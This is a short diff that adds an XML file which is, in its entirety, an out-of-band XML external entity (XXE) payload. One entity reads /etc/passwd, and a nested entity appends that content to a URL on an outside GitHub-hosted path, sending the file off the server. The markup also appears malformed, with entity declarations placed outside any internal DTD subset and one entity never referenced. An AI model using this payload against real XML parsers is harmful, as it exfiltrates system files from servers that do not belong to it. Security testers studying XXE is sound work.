@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE xref SYSTEM "https://svn.code.sf.net/p/docbook/code/trunk/testdocs/linking.dtd">
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY external SYSTEM 'https://github.com/Rabdomante/out-of-bound-forge/external_read_file.xml?data=%payload;'>">
